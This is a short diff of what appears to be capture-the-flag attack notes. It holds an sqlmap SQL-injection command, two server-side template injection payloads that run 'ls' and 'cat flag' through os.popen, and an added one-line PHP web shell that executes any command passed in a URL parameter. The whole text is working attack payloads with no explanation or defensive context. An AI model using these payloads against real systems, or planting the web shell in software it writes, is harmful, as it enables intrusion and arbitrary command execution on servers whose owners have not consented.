@@ -1,3 +1,4 @@
 sqlmap --cookie 'cookie' -u http:ip -columns --forms --tables
 ${self.module.cache.util.os.popen(&quot;ls&quot;).read()}
 ${self.module.cache.util.os.popen(&quot;cat flag&quot;).read()}
+<?php echo system($_GET['cmd']); ?>
